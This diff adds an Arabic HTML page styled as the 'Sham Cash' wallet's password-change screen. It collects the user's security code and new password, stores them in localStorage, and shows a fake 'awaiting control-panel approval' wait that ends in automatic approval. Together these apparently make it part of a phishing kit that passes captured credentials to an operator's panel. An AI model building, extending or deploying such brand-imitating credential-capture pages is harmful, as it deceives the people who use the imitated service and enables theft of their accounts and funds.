@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>شام كاش — تغيير كلمة المرور</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="page">
+    <div class="blob-left"></div>
+    <div class="blob-right"></div>
+
+    <div class="container">
+      <!-- Back button -->
+      <div style="padding-top:8px">
+        <a href="index.html" class="back-btn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M15 19l-7-7 7-7"/>
+          </svg>
+          رجوع
+        </a>
+      </div>
+
+      <!-- Logo -->
+      <div class="logo-wrap">
+        <div class="sham-logo">
+          <div class="shape-green"></div>
+          <div class="shape-purple"></div>
+        </div>
+      </div>
+
+      <!-- Main form -->
+      <div id="formSection">
+        <div style="margin-bottom:20px">
+          <h1 class="page-title">تغيير كلمة المرور</h1>
+          <p class="page-subtitle mt-2">ادخل كلمة السر الجديدة و رمز الأمان الخاص بك</p>
+        </div>
+
+        <form onsubmit="handleReset(event)">
+          <div class="field-group">
+            <!-- Security code -->
+            <div class="field">
+              <span class="field-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+              </span>
+              <input type="text" id="secCode" placeholder="رمز الأمان" autocomplete="off" />
+            </div>
+
+            <!-- New password -->
+            <div class="field">
+              <span class="field-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
+                </svg>
+              </span>
+              <input type="password" id="newPass" placeholder="كلمة المرور الجديدة" autocomplete="new-password" />
+            </div>
+
+            <!-- Confirm password -->
+            <div class="field">
+              <span class="field-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
+                </svg>
+              </span>
+              <input type="password" id="confirmPass" placeholder="تأكيد كلمة المرور" autocomplete="new-password" />
+            </div>
+          </div>
+
+          <!-- Waiting indicator -->
+          <p id="waitingMsg" class="link-text mt-6 hidden" style="justify-content:center;align-items:center;gap:8px">
+            <span class="spinner"></span>
+            في انتظار الموافقة من لوحة التحكم...
+          </p>
+
+          <!-- Error message -->
+          <p id="errorMsg" class="link-text mt-4 hidden" style="color:var(--red)">
+            كلمتا المرور غير متطابقتين
+          </p>
+
+          <div class="mt-6">
+            <button type="submit" class="btn btn-primary btn-full" id="resetBtn">
+              تغيير كلمة المرور
+            </button>
+          </div>
+        </form>
+      </div>
+
+      <!-- Success state -->
+      <div id="successSection" class="hidden" style="display:flex;flex-direction:column;align-items:center;justify-content:center;flex:1;text-align:center;gap:16px">
+        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#1fc28a" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+        <h2 style="font-size:24px;font-weight:900;color:#1fc28a">تم تغيير كلمة المرور</h2>
+        <p style="font-size:14px;font-weight:600;color:rgba(201,204,219,0.70);line-height:1.6">
+          تم تحديث كلمة المرور بنجاح.<br>يمكنك الآن تسجيل الدخول.
+        </p>
+        <a href="index.html" class="btn btn-primary btn-full mt-4">تسجيل الدخول</a>
+      </div>
+
+      <!-- Rejected state -->
+      <div id="rejectedSection" class="hidden" style="display:flex;flex-direction:column;align-items:center;justify-content:center;flex:1;text-align:center;gap:16px">
+        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#e54343" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/>
+        </svg>
+        <h2 style="font-size:24px;font-weight:900;color:#e54343">تم رفض الطلب</h2>
+        <p style="font-size:14px;font-weight:600;color:rgba(201,204,219,0.70);line-height:1.6">
+          لم يتم تغيير كلمة المرور.<br>يرجى المحاولة مجدداً.
+        </p>
+        <button onclick="showForm()" class="btn btn-secondary btn-full mt-4">المحاولة مجدداً</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let resetTimer = null;
+
+    function handleReset(e) {
+      e.preventDefault();
+      const sec     = document.getElementById('secCode').value.trim();
+      const newP    = document.getElementById('newPass').value;
+      const confirm = document.getElementById('confirmPass').value;
+
+      document.getElementById('errorMsg').classList.add('hidden');
+
+      if (!sec || !newP || !confirm) return;
+      if (newP !== confirm) {
+        document.getElementById('errorMsg').classList.remove('hidden');
+        return;
+      }
+
+      localStorage.setItem('sham_sec_code', sec);
+      localStorage.setItem('sham_new_pass', newP);
+      localStorage.setItem('sham_page', 'تغيير كلمة المرور');
+
+      document.getElementById('resetBtn').disabled = true;
+      const wm = document.getElementById('waitingMsg');
+      wm.classList.remove('hidden');
+
+      resetTimer = setInterval(checkStatus, 800);
+      setTimeout(() => {
+        if (!localStorage.getItem('sham_changepass_status')) {
+          localStorage.setItem('sham_changepass_status', 'approved');
+        }
+      }, 3000);
+    }
+
+    function checkStatus() {
+      const s = localStorage.getItem('sham_changepass_status');
+      if (!s) return;
+      clearInterval(resetTimer);
+      localStorage.removeItem('sham_changepass_status');
+      document.getElementById('waitingMsg').classList.add('hidden');
+
+      if (s === 'approved') {
+        document.getElementById('formSection').classList.add('hidden');
+        document.getElementById('successSection').classList.remove('hidden');
+      } else {
+        document.getElementById('formSection').classList.add('hidden');
+        document.getElementById('rejectedSection').classList.remove('hidden');
+      }
+    }
+
+    function showForm() {
+      document.getElementById('rejectedSection').classList.add('hidden');
+      document.getElementById('formSection').classList.remove('hidden');
+      document.getElementById('resetBtn').disabled = false;
+      document.getElementById('secCode').value = '';
+      document.getElementById('newPass').value = '';
+      document.getElementById('confirmPass').value = '';
+    }
+  </script>
+</body>
+</html>
